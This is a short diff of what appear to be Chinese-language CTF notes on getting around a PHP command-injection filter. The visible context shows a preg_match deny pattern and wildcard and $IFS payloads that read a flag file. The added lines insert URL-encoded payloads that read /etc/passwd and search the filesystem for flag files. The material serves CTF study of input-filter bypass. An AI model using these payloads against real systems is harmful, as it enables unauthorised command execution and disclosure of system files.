@@ -13,6 +13,12 @@ if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.
 ?c=/bin/c??$IFS????????    //在bin目录中读取c??  其实就是cat了
 ?c=grep${IFS}'{'${IFS}fl???php
 （在 fl???php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行）
+
+
+
+
+cmd=/bin/cat%20/etc/passwd
+cmd=/usr/bin/find%20/%20-name%20flag*
 ```
 
 ^
